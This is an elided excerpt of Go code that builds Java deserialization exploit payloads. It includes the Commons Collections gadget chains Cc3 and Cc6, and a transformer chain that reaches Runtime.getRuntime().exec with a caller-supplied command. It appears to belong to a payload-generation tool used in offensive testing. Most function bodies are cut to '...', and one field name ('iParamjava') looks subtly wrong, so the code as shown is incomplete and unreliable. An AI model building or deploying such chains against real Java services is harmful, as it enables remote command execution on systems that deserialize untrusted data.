...
func Cc3(bytecode []byte) java.Object {
	...
	return NewAnnotationInvocationHandlerClass(TargetClass, decorateMap)
}
...
func Cc6(cmd string) java.Object {
	...
	*/
	...
	tiedMapEntry := NewTiedMapEntry(lazyMap, java.NewStrObj("aaa"))
	map2 := rt.NewJHashMap()
...
func NewTransformerArr(cmd string) java.Object {
	...
	*/
	...
	transformers[1] = NewInvokerTransformer("getMethod", []Class{java.StringClass, java.ClassArrayClass}, []java.Object{java.NewStrObj("getRuntime"), java.NULL})
	transformers[2] = NewInvokerTransformer("invoke", []Class{java.ObjectClass, java.ObjectArrayClass}, []java.Object{java.NULL, java.NULL})
	transformers[3] = NewInvokerTransformer("exec", []Class{java.StringClass}, []java.Object{java.NewStrObj(cmd)})
...
func NewInvokerTransformer(methodName string, argClasses []java.Class, args []java.Object) java.Object {
	...
	transformer.Fields["iParamjava"] = argClasses
...
func NewAnnotationInvocationHandlerClass(typeClass java.Class, mapVal java.Object) java.Object {
